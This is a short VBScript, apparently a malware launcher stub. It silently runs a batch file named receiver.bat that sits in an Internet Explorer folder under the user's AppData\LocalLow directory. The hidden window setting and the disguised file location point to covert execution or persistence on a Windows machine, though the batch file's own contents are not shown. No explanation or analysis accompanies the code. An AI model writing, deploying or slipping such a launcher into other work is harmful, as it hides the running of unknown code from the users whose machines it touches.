Set WshShell = CreateObject("WScript.Shell" ) 
WshShell.Run chr(34) & "%USERPROFILE%\AppData\LocalLow\Microsoft\Internet Explorer\receiver.bat" & Chr(34), 0 
Set WshShell = Nothing
